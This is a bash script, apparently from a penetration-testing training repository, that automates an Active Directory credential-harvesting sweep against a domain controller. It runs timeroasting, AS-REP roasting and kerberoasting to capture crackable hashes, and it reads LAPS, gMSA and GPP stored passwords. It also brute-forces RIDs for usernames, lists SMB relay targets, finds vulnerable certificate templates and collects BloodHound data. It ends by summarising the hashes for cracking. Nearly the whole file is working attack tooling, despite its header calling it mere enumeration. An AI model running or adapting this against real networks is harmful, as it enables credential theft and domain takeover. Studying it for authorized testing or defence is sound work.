#!/usr/bin/env bash
# ad-enum.sh -- post-foothold Active Directory enumeration/credential-harvesting sweep.
#
# Everything here is enumeration/collection, not exploitation: RID-brute, kerberoasting,
# AS-REP roasting, timeroasting, GPP/LAPS reads, ADCS misconfig triage, and BloodHound
# collection are all standard, exam-safe OSCP techniques (see notes/ad-*.md in this repo).
# This script harvests and stops -- it never cracks a hash or logs into a found credential.
#
# Usage: ad-enum.sh <dc_ip> <domain> [-u user -p pass]
#   Unauthenticated-capable stages always run. Authenticated stages run only if -u/-p given.
set -uo pipefail

DC_IP="${1:-}"
DOMAIN="${2:-}"
shift 2 2>/dev/null || true
AD_USER=""
AD_PASS=""
while [[ $# -gt 0 ]]; do
    case "$1" in
        -u)
            if [[ $# -lt 2 ]]; then echo "[!] -u requires an argument" >&2; exit 1; fi
            AD_USER="$2"; shift 2 ;;
        -p)
            if [[ $# -lt 2 ]]; then echo "[!] -p requires an argument" >&2; exit 1; fi
            AD_PASS="$2"; shift 2 ;;
        *) shift ;;
    esac
done

if [[ -z "$DC_IP" || -z "$DOMAIN" ]]; then
    echo "Usage: $0 <dc_ip> <domain> [-u user -p pass]" >&2
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/hashmodes.sh
source "$SCRIPT_DIR/lib/hashmodes.sh"

OUT="./ad-enum-out/${DC_IP}"
if ! mkdir -p "$OUT"; then
    echo "[!] Failed to create output directory: $OUT" >&2
    exit 1
fi
echo "[*] Output directory: $OUT"

MISSING=()
for tool in enum4linux-ng nxc bloodhound-python; do
    command -v "$tool" >/dev/null 2>&1 || MISSING+=("$tool")
done
if [[ ${#MISSING[@]} -gt 0 ]]; then
    echo "[!] Missing tools, related stages will be skipped: ${MISSING[*]}" >&2
    echo "    enum4linux-ng: https://github.com/cddmp/enum4linux-ng" >&2
    echo "    nxc (netexec): pipx install git+https://github.com/Pennyw0rth/NetExec" >&2
    echo "    bloodhound-python: pipx install bloodhound" >&2
fi
if ! command -v certipy >/dev/null 2>&1; then
    echo "[i] certipy not found -- ADCS stage will be skipped if a CA is present. pipx install certipy-ad" >&2
fi
if [[ ! -f "./timeroast.py" ]] && ! command -v timeroast.py >/dev/null 2>&1; then
    echo "[i] timeroast.py not found in cwd/PATH -- timeroasting stage will be skipped." >&2
    echo "    git clone https://github.com/SecuraBV/Timeroast" >&2
fi

echo
echo "###### Unauthenticated / low-cost stages ######"

if command -v enum4linux-ng >/dev/null 2>&1; then
    echo "[*] enum4linux-ng"
    enum4linux-ng -A "$DC_IP" -oJ "$OUT/enum4linux" >"$OUT/enum4linux.log" 2>&1
fi

if [[ -f "./timeroast.py" ]] || command -v timeroast.py >/dev/null 2>&1; then
    echo "[*] Timeroasting (unauthenticated MS-SNTP computer-account hash extraction)"
    TIMEROAST_BIN="./timeroast.py"; command -v timeroast.py >/dev/null 2>&1 && TIMEROAST_BIN="timeroast.py"
    python3 "$TIMEROAST_BIN" "$DC_IP" -o "$OUT/timeroast.hash" >"$OUT/timeroast.log" 2>&1
fi

if command -v nxc >/dev/null 2>&1; then
    echo "[*] AS-REP roast sweep (null bind -- catches no-preauth accounts with no creds needed)"
    nxc ldap "$DC_IP" -u '' -p '' --asreproast "$OUT/asrep.hash" >"$OUT/asrep-nullbind.log" 2>&1
fi

if [[ -n "$AD_USER" && -n "$AD_PASS" ]]; then
    echo
    echo "###### Authenticated stages (as $AD_USER) ######"

    if ! command -v nxc >/dev/null 2>&1; then
        echo "[!] nxc (netexec) not found -- authenticated stages require it. pipx install git+https://github.com/Pennyw0rth/NetExec" >&2
        exit 1
    fi

    echo "[*] LDAP user listing"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --users >"$OUT/ldap-users.log" 2>&1

    echo "[*] SMB RID brute (more usernames)"
    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --rid-brute >"$OUT/rid-brute.log" 2>&1

    echo "[*] Kerberoasting"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --kerberoasting "$OUT/kerberoast.hash" >"$OUT/kerberoast.log" 2>&1

    echo "[*] AS-REP roasting (authenticated, broader than the null-bind sweep)"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --asreproast "$OUT/asrep-auth.hash" >"$OUT/asrep-auth.log" 2>&1

    echo "[*] Password/lockout policy"
    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --pass-pol >"$OUT/pass-pol.log" 2>&1

    echo "[*] Disabled accounts (raw LDAP query, no dedicated nxc flag exists)"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" \
        --query "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" "sAMAccountName" \
        >"$OUT/disabled-accounts.log" 2>&1

    echo "[*] SMB share enumeration"
    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --shares >"$OUT/shares.log" 2>&1

    echo "[*] SMB signing check (relay target list)"
    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --gen-relay-list "$OUT/relay-targets.txt" >"$OUT/smb-signing.log" 2>&1

    echo "[*] Delegation-trust listing"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --trusted-for-delegation >"$OUT/delegation.log" 2>&1

    echo "[*] gMSA password read attempt"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" --gmsa >"$OUT/gmsa.log" 2>&1

    echo "[*] Description field password grep"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" \
        --query "(objectClass=user)" "sAMAccountName description" \
        >"$OUT/user-descriptions.log" 2>&1

    echo "[*] GPP cpassword sweep"
    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M gpp_password >"$OUT/gpp-password.log" 2>&1
    nxc smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M gpp_autologin >"$OUT/gpp-autologin.log" 2>&1

    echo "[*] LAPS read"
    # --laps is an smb/winrm-only auth-helper flag in current netexec, not an ldap flag -- the
    # actual bulk LDAP LAPS-password dump (incl. LAPS v2 msLAPS-EncryptedPassword decryption) is
    # the 'laps' module.
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M laps >"$OUT/laps.log" 2>&1

    echo "[*] ADCS triage"
    nxc ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -M adcs >"$OUT/adcs-triage.log" 2>&1
    if command -v certipy >/dev/null 2>&1 && grep -q 'Found PKI' "$OUT/adcs-triage.log" 2>/dev/null; then
        echo "  CA indicator found -- running certipy find -vulnerable"
        certipy find -u "${AD_USER}@${DOMAIN}" -p "$AD_PASS" -dc-ip "$DC_IP" -vulnerable -stdout >"$OUT/certipy-find.log" 2>&1
    fi

    if command -v bloodhound-python >/dev/null 2>&1; then
        echo "[*] BloodHound collection (DCOnly)"
        bloodhound-python -c DCOnly -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" -ns "$DC_IP" \
            --zip -op "$OUT/bloodhound" >"$OUT/bloodhound.log" 2>&1
        echo "  -> import the resulting .zip into the BloodHound GUI; this script does not interpret DACL/edge data itself."
    fi
else
    echo
    echo "[*] No -u/-p given -- authenticated stages skipped. Re-run with -u <user> -p <pass> once you have a credential."
fi

echo
echo "###### Parsing output ######"

USERS_FILE="$OUT/users.txt"
{
    # enum4linux-ng -oJ writes {"users": {"<rid>": {"username": "...", ...}, ...}} -- keys[] would
    # yield RIDs, not usernames.
    [[ -f "$OUT/enum4linux.json" ]] && command -v jq >/dev/null 2>&1 && \
        jq -r '.users // {} | .[]?.username // empty' "$OUT/enum4linux.json" 2>/dev/null
    [[ -f "$OUT/rid-brute.log" ]] && grep -oP '(?<=\\)[A-Za-z0-9._-]+(?=\s)' "$OUT/rid-brute.log" 2>/dev/null
    # nxc ldap --users prints "<module> <host> <port> <hostname> <sAMAccountName><pad>..." -- take
    # the 5th whitespace-delimited field, skipping the "-Username-" header and "[*] Enumerated..."
    # status lines it also writes to the same log.
    [[ -f "$OUT/ldap-users.log" ]] && \
        grep -oP '^\S+\s+\S+\s+\S+\s+\S+\s+\K[A-Za-z0-9][A-Za-z0-9._-]*(?=\s)' "$OUT/ldap-users.log" 2>/dev/null
    # Kerberoast hash: $krb5tgs$23$*user$realm$spn*$chk$data -- field 4 is "*user", strip the '*'.
    [[ -f "$OUT/kerberoast.hash" ]] && cut -d'$' -f4 "$OUT/kerberoast.hash" 2>/dev/null | sed 's/^\*//'
    # AS-REP hash: $krb5asrep$23$user@REALM:chk$data -- field 4 is "user@REALM:chk", split on '@'.
    for af in "$OUT/asrep.hash" "$OUT/asrep-auth.hash"; do
        [[ -f "$af" ]] && cut -d'$' -f4 "$af" 2>/dev/null | cut -d'@' -f1
    done
} | sed '/^\s*$/d' | sort -u > "$USERS_FILE"
echo "[*] Deduplicated usernames -> $USERS_FILE ($(wc -l <"$USERS_FILE" 2>/dev/null || echo 0) found)"

echo
echo "=================== SUMMARY: $DC_IP ($DOMAIN) ==================="
echo "Hash files and how to crack them:"
FOUND_ANY=0
for hf in "$OUT/kerberoast.hash" "$OUT/asrep.hash" "$OUT/asrep-auth.hash" "$OUT/timeroast.hash"; do
    if [[ -s "$hf" ]]; then
        FOUND_ANY=1
        COUNT="$(grep -c . "$hf" 2>/dev/null || echo 0)"
        echo "  $hf ($COUNT hash(es)):"
        hashmode_summary_line "$hf" | sed 's/^/  /'
    fi
done
[[ $FOUND_ANY -eq 0 ]] && echo "  (none captured this run)"
echo "===================================================================="
echo "[*] Full raw output saved under: $OUT/"
